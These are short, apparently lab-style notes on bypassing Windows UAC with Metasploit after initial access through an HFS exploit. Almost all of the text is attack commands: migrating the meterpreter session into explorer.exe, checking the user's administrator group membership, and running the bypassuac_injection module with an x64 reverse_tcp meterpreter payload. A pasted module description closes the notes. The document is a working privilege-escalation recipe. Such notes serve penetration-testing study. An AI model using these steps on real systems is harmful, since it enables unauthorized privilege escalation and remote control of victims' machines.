### UAC Bypass with Metasploit (Memory Injection)

*Notes: Initial access with HFS rejetto exploit*

##### Migrate to x64 process

> - ps -S explorer.exe
> - migrate 2440

*Notes: the explorer.exe arch is x64 bit so later when we perform UAC bypass, we have to use x64 based meterpreter payload*

##### Check if the user belongs to local group

> - shell
> - net localgroup administrators

##### UAC Bypass Module

> - use exploit/windows/local/bypassuac_injection
> - set session 1
> - set TARGET 1
> - set PAYLOAD windows/x64/meterpreter/reverse_tcp
> - exploit

*This module will bypass Windows UAC by utilizing the trusted publisher certificate through process injection. It will spawn a second shell that has the UAC flag turned off. This module uses the Reflective DLL Injection technique to drop only the DLL payload binary instead of three separate binaries in the standard technique. However, it requires the correct architecture to be selected, (use x64 for SYSWOW64 systems also). If specifying EXE::Custom your DLL should call ExitProcess() after starting your payload in a separate process*
